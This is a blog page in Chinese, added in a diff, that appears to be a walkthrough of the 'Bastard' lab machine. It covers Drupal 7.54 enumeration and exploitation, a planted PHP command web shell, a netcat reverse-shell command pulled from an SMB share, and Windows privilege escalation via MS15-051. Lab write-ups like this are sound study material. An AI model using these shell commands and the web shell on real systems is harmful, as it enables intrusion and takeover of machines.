@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>bastard | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scan #### port explore 80:80端口是一个认证登陆界面，可以注册新用户，但是注册新用户会发送一封邮件到你的邮箱，这是一个内网靶场，故不会是通过这种方法注册一个新用户 135:一般认为是rpc服务的端口，可以尝试用rpcclient连接测试 &#96;rpcclient -U &quot;&quot; -N 10.10.10.9&#96; 但是登录失败 #### 目录扫描 目录扫描时发现一个chang">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bastard">
+<meta property="og:url" content="http://example.com/2022/09/06/bastard/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scan #### port explore 80:80端口是一个认证登陆界面，可以注册新用户，但是注册新用户会发送一封邮件到你的邮箱，这是一个内网靶场，故不会是通过这种方法注册一个新用户 135:一般认为是rpc服务的端口，可以尝试用rpcclient连接测试 &#96;rpcclient -U &quot;&quot; -N 10.10.10.9&#96; 但是登录失败 #### 目录扫描 目录扫描时发现一个chang">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/09/06/bastard/nmap.png">
+<meta property="og:image" content="http://example.com/2022/09/06/bastard/payload.png">
+<meta property="og:image" content="http://example.com/2022/09/06/bastard/41564.png">
+<meta property="og:image" content="http://example.com/2022/09/06/bastard/session.png">
+<meta property="og:image" content="http://example.com/2022/09/06/bastard/user.png">
+<meta property="og:image" content="http://example.com/2022/09/06/bastard/d7.png">
+<meta property="og:image" content="http://example.com/2022/09/06/bastard/whoami.png">
+<meta property="og:image" content="http://example.com/2022/09/06/bastard/nc.png">
+<meta property="og:image" content="http://example.com/2022/09/06/bastard/ker1.png">
+<meta property="og:image" content="http://example.com/2022/09/06/bastard/ker2.png">
+<meta property="og:image" content="http://example.com/2022/09/06/bastard/root1.png">
+<meta property="og:image" content="http://example.com/2022/09/06/bastard/root2.png">
+<meta property="article:published_time" content="2022-09-06T06:48:32.000Z">
+<meta property="article:modified_time" content="2022-09-06T09:34:16.290Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/09/06/bastard/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-bastard" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/09/06/bastard/" class="article-date">
+  <time class="dt-published" datetime="2022-09-06T06:48:32.000Z" itemprop="datePublished">2022-09-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      bastard
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/06/bastard/nmap.png">
+#### port explore
+80:80端口是一个认证登陆界面，可以注册新用户，但是注册新用户会发送一封邮件到你的邮箱，这是一个内网靶场，故不会是通过这种方法注册一个新用户
+135:一般认为是rpc服务的端口，可以尝试用rpcclient连接测试
+`rpcclient -U "" -N 10.10.10.9`
+但是登录失败
+#### 目录扫描
+目录扫描时发现一个changelog.txt，其中所记录的最新的durpal是7.54,所以可以合理怀疑该系统的版本应该是7.54
+`dirsearch -u 10.10.10.9 -e php -x 403,404 -t 50`
+searchsploit drupal 7可以搜到几个需要认证后的代码执行和一个7.x版本的通用远程代码执行
+该exploit会攻击由服务扩展创建的REST端点，我们只需要找出REST端点的名称即可利用该漏洞
+<img src="/2022/09/06/bastard/payload.png">
+将上面的替换成目标网址和目标endpoint_path
+将写入的文件内容替换为`<?php system($_REQUEST["cmd"]); ?>`
+利用php执行41564.php
+<img src="/2022/09/06/bastard/41564.png">
+得到session和user的json文件
+<img src="/2022/09/06/bastard/session.png">
+<img src="/2022/09/06/bastard/user.png">
+用hashcat尝试破解一下admin的登陆密码,但是很慢
+<img src="/2022/09/06/bastard/d7.png">
+既然我们有了一个可以执行cmd的php页面，那么我们可以尝试让它下载nc并与我们建立连接
+<img src="/2022/09/06/bastard/whoami.png">
+#### user
+用smbserver共享nc并让目标机器访问该文件并使用nc连接到本机
+`?cmd=\\10.10.14.5\share\nc.exe -e cmd 10.10.14.5 8888`
+<img src="/2022/09/06/bastard/nc.png">
+传一个sherlock进行漏洞信息收集
+`powershell.exe -exec bypass -Command "& {Import-Module C:\inetpub\drupal-7.54\Sherlock.ps1;Find-AllVulns}`
+<img src="/2022/09/06/bastard/ker1.png">
+<img src="/2022/09/06/bastard/ker2.png">
+可以尝试利用MS15-051
+<img src="/2022/09/06/bastard/root1.png">
+<img src="/2022/09/06/bastard/root2.png">
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/06/bastard/" data-id="cl7pyk3mj00001icp5713gida" data-title="bastard" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/09/06/cronos/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          cronos
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/09/05/popcorn/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">popcorn</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/09/07/nineveh/">nineveh</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/haircut/">haircut</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/cronos/">cronos</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/bastard/">bastard</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/popcorn/">popcorn</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
